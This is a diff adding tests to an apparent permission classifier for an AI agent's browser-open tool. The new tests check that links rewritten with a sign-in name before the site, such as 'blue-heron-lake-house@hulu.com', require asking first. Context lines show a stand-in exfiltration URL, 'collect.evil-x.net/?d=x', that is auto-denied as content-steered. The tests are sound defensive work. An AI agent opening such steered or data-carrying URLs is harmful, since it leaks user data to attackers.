@@ -139,6 +139,21 @@ describe('browser open and what the address carries', () => {
     expect(decision).toMatchObject({ tier: 1, reason: 'browser_open' });
   });
 
+  it('asks before opening the link the person gave once a sign-in name is put before its site', async () => {
+    const ctx = ctxAfterReading();
+    recordPersonText({ provenance: ctx.web_search.provenance, text: 'can you open https://hulu.com/account please' });
+    const decision = await classifyTier(open('https://blue-heron-lake-house@hulu.com/account'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'browser_open_unvouched' });
+    expect(decision.card?.destination).toBe('https://blue-heron-lake-house@hulu.com/account');
+  });
+
+  it('asks before opening the front page of a site the person named once a sign-in name is put before it', async () => {
+    const ctx = ctxAfterReading();
+    recordPersonText({ provenance: ctx.web_search.provenance, text: 'check hulu.com for me' });
+    const decision = await classifyTier(open('https://blue-heron-lake-house@hulu.com/'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'browser_open_unvouched' });
+  });
+
   it('skips, rather than asks, an unvouched open in a scheduled run', async () => {
     const decision = await classifyTier(open('https://collect.evil-x.net/?d=x'), ctxAfterReading({ unattended: true }));
     expect(decision).toMatchObject({ reason: 'auto_denied', auto_deny: 'steered_by_content' });
